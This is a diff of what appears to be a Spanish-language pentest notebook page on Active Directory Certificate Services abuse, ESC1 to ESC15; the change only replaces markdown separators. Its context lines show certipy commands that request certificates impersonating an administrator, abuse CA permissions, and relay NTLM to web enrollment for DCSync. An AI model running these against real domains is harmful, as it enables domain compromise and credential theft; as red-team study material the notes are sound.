@@ -18,7 +18,7 @@ linked:
 ---
 # AD - ADCS Enumeration - ESC1-ESC15 Identification
 
-***
+---
 
 ## ESC1 (SAN + Client Auth)
 
@@ -38,7 +38,7 @@ certipy auth -pfx administrator.pfx -dc-ip <DC>
 # Output: Administrator NT hash + TGT
 ```
 
-___
+---
 
 ## ESC2 (Any Purpose)
 
@@ -55,7 +55,7 @@ certipy req -u atacante@corp.local -p pass -ca <CA-name> -template <vuln-templat
 certipy auth -pfx <cert>.pfx -dc-ip <DC>
 ```
 
-___
+---
 
 ## ESC3 (Enrollment Agent)
 
@@ -78,7 +78,7 @@ certipy req -u atacante@corp.local -p pass -ca <CA-name> \
 certipy auth -pfx administrator.pfx -dc-ip <DC>
 ```
 
-___
+---
 
 ## ESC4 (Vulnerable Template ACL)
 
@@ -99,7 +99,7 @@ certipy req -u atacante -p pass -ca <CA-name> -template <victim-template> -upn a
 certipy template -u atacante -p pass -dc-ip <DC> -template <victim-template> -load <saved-config>
 ```
 
-___
+---
 
 ## ESC5 (Vulnerable PKI Object ACL)
 
@@ -109,7 +109,7 @@ ___
 | `Find-InterestingDomainAcl -ResolveGUIDs \| ? ObjectDN -match "Public Key Services"` | Hunt | Audit. |
 ^ad-esc5
 
-___
+---
 
 ## ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
 
@@ -126,7 +126,7 @@ certipy req -u atacante@corp.local -p pass -ca <vuln-CA> \
 # El CA acepta SAN custom incluso si template no permite ENROLLEE_SUPPLIES_SUBJECT
 ```
 
-___
+---
 
 ## ESC7 (Vulnerable CA ACL)
 
@@ -147,7 +147,7 @@ certipy ca -u atacante -p pass -ca <CA-name> -issue-request <req-id>
 certipy req -u atacante -p pass -ca <CA-name> -retrieve <req-id>
 ```
 
-___
+---
 
 ## ESC8 (Web Enrollment Relay)
 
@@ -168,7 +168,7 @@ ntlmrelayx.py -t http://<CA-host>/certsrv/certfnsh.asp \
 # Output: cert para victim DC$ → DCSync via PKINIT
 ```
 
-___
+---
 
 ## ESC9 (No Security Extension)
 
@@ -185,7 +185,7 @@ certipy req -u <victim>@corp.local -p '<victim-pass>' -ca <CA-name> -template <E
 certipy auth -pfx victim.pfx -dc-ip <DC>
 ```
 
-___
+---
 
 ## ESC10 (Weak Cert Mappings)
 
@@ -195,7 +195,7 @@ ___
 | `CertificateMappingMethods = 0x4` (UPN-only mapping) | Registry check | Modern requirement: bit 0x10. |
 ^ad-esc10
 
-___
+---
 
 ## ESC11 (LDAP NO_PROTECTION_POLICY)
 
@@ -204,7 +204,7 @@ ___
 | LDAP signing/channel-binding off | `nxc ldap <DC> -u u -p p --signing` | NTLM Relay LDAP-style → cert. |
 ^ad-esc11
 
-___
+---
 
 ## ESC12-ESC15 (Modern)
 
@@ -221,4 +221,4 @@ ___
 certipy find -u u -p pass -dc-ip <DC> -text -vulnerable | grep -A5 "ESC13"
 ```
 
-***
+---
